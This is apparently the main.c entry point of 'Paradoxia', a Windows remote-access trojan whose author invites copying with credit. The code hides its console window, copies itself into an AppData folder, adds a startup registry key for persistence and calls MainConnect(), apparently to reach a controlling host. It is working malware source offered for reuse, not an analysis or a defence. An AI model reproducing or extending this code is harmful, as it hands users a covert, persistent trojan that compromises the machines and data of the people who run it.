/*
Author: Fahad (QuantumCore)
main.c (c) 2020
 
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/
/*
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
*/
#include "paradoxia.h"
int main() // entry point
{
    // O_o
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char installPath[BUFFER];
    char installDir[BUFFER];
    memset(installPath,'\0', BUFFER);
    snprintf(installPath, BUFFER, "%s\\%s\\%s", appDataPath(), INSTALL_FOLDER_NAME, INSTALL_NAME);
    memset(installDir,'\0', BUFFER);
    snprintf(installDir, BUFFER, "%s\\%s\\", appDataPath(), INSTALL_FOLDER_NAME);
    CreateDirectory (installDir, NULL);
    CopyFile(ParadoxiaInfo(), installPath, TRUE);
    StartupKey(installPath);
    MainConnect();
    return 0;
}
